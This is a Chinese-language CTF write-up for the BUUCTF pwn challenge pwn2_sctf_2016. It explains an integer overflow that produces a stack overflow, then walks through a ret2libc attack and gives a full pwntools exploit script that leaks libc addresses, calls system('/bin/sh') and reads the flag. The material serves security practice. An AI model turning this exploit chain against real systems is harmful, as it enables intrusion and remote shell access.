---
title: "BUUCTF Pwn Pwn2_sctf_2016"
date: 2020-03-10T22:00:13+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# pwn2_sctf_2016

32位系统，只开启NX

![image-20200310221013860](/images/image-20200310221013860.png)

考点：整数溢出、ret2libc3

存在system的系统调用号，但是无/bin/sh，也没有好用的gadget所以决定ret2libc3

![image-20200310233308519](/images/image-20200310233308519.png)

![image-20200310233331026](/images/image-20200310233331026.png)

思路：

1、整数溢出创造可以输入的数据非常大

2、栈溢出构造rop来ret2libc3，从而getshell

![image-20200310225507284](/images/image-20200310225507284.png)

这里的v2变量是为int型的-1可以绕过if(v2>32)的判断，但是return之前的get_n()是以unsigned int来接收的v2，所以这里造成v2变得非常大(整数溢出)，这可以去了解c语言数据在内存中如何存储来理解漏洞的形成

而这里的&nptr的到栈底的偏移只有0x2c，所以造成栈溢出

![image-20200310221249854](/images/image-20200310221249854.png)

![image-20200310221102432](/images/image-20200310221102432.png)

计算stack offset = 0x2c + fakeebp = 0x2c +0x4 = 0x30 = 48字节

![image-20200310231658730](/images/image-20200310231658730.png)

```python
#!/usr/bin/env python2
#-*-coding-UTF-8-*-

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

#sh = process('./pwn2_sctf_2016')
sh = remote('node3.buuoj.cn',29229)
elf = ELF('./pwn2_sctf_2016')
libc = ELF('./x86-libc-2.23.so')

atoi_got_addr = elf.got['atoi']
printf_plt_addr = elf.plt['printf']
formatstr_addr = 0x80486f8         # %s
main_addr = elf.symbols['main']

fakeebp = 0x4
offset = 0x2c + fakeebp #48字节
#利用printf函数来leak在libc中的atoi函数
leak_payload = 'a' * offset 
leak_payload+= p32(printf_plt_addr) + p32(main_addr) + p32(formatstr_addr) + p32(atoi_got_addr)
sh.sendlineafter('How many bytes do you want me to read?','-1')
sh.sendlineafter('bytes of data!\n',leak_payload)

sh.recvuntil('You said: ')#这里是接收main函数执行完的输出
sh.recvuntil('You said: ')#这里才是接收rop链造成的输出，leak出的地址在这里面
atoi_realaddr = u32(sh.recvuntil('\xf7')[-4:])
log.success('leak_atoi_real_addr => {}'.format(hex(atoi_realaddr)))
#libcsearcher好像没有对应的libc
'''libc = LibcSearcher('atoi',atoi_realaddr)
base_addr = atoi_realaddr - libc.dump('atoi')
system_addr = libc.dump('system') + base_addr
binsh_addr = libc.dump('str_bin_sh') + base_addr'''

base_addr = atoi_realaddr - libc.symbols['atoi']
system_addr = libc.symbols['system'] + base_addr
binsh_addr = libc.search('/bin/sh').next() + base_addr

payload = 'a' * offset + p32(system_addr) + p32(main_addr) + p32(binsh_addr)

sh.sendlineafter('How many bytes do you want me to read?','-1')
sh.sendlineafter('bytes of data!\n',payload)

sh.sendline('cat flag')
sh.interactive()
```

![image-20200310232904813](/images/image-20200310232904813.png)

